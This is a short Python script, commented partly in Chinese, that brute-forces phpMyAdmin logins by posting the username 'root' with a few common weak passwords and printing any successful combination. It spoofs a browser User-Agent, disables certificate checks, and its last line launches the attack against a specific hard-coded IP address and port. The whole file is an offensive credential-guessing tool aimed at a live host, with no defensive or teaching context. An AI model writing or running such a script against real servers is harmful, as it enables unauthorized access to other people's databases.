import requests

def phpmyadminFuzz(url):
    url = url + '/phpmyadmin/index.php'
    username = ['root']
    password = ['123456', '111111','root']  #对网站用户名和密码进行爆破！
    for i in username:   # root
        for j in password: # 123456
            data = {
                "pma_username": i,
                "pma_password": j,
                "server": "1",
            }
            try:
                headers = {
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0'}
                r = requests.post(url, headers=headers, data=data, verify=False, allow_redirects=True, timeout=10)
                if r.status_code == 200 and 'phpMyAdmin phpStudy 2014' in r.text:
                    print('\033[32m[+]%s Login Success！ username:%s&password:%s\033[0m' % (url, i, j))
                    #登录成功退出
                    break
                else:
                    # print('\033[31m[-]%s Login False\033[0m' % url)
                    pass
            except Exception as e:
                print('[!]%s is timeout' % url)
                #登录超时退出
                break
phpmyadminFuzz("http://175.167.178.134:9090/")



